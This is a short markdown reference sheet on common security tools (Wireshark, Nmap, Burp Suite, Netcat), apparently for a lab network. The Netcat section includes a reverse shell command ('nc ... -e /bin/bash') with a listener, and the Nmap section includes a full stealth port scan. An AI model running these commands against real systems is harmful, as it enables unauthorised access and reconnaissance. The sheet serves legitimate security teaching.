# Cybersecurity Tools Reference

Essential security tools used for network analysis, vulnerability scanning, web security assessment, and manual network connection testing.

---

## 1. Wireshark
* **Purpose:** A graphical network protocol analyzer (packet sniffer) used for network troubleshooting, analysis, software development, and security investigations.
* **Key Features:** Real-time packet capture, deep packet inspection, display filters (`ip.addr == 192.168.56.101`, `http`, `tcp.flags.syn == 1`), follow TCP stream.
* **Basic Usage:**
  1. Select network interface (e.g., `eth0` or Host-only interface).
  2. Start packet capture.
  3. Apply display filters to isolate relevant traffic.
  4. Inspect frame details and payload.

---

## 2. Nmap (Network Mapper)
* **Purpose:** An open-source network discovery and vulnerability scanner used to discover hosts, open ports, and services on a computer network.
* **Key Features:** Host discovery, port scanning, OS detection, service version detection, Script Engine (NSE).
* **Basic Commands:**
  ```bash
  # Quick scan target IP
  nmap 192.168.56.101

  # Service version detection and OS identification
  nmap -sV -O 192.168.56.101

  # Full SYN stealth scan across all ports with default scripts
  nmap -sS -sC -sV -p- 192.168.56.101
  ```

---

## 3. Burp Suite
* **Purpose:** An integrated platform and web application security testing tool used for performing manual security assessments and identifying web vulnerabilities (e.g., SQLi, XSS, CSRF).
* **Key Features:** HTTP Intercepting Proxy, Repeater, Intruder, Decoder, Target Site Map.
* **Basic Usage:**
  1. Configure browser proxy settings to point to Burp (e.g., `127.0.0.1:8080`).
  2. Enable Intercept in Burp Proxy.
  3. Capture HTTP request, inspect parameters, send to Repeater for payload manipulation and reissuing requests.

---

## 4. Netcat (`nc`)
* **Purpose:** Known as the "Swiss Army knife" of networking, Netcat reads and writes data across network connections using TCP or UDP protocols.
* **Key Features:** Port listening, banner grabbing, port scanning, simple file transfers, bind/reverse shell creation.
* **Basic Commands:**
  ```bash
  # Banner grabbing / connect to port
  nc -vn 192.168.56.101 80

  # Listen on port (Server mode)
  nc -lvnp 4444

  # Reverse shell client connection
  nc 192.168.56.1 4444 -e /bin/bash
  ```
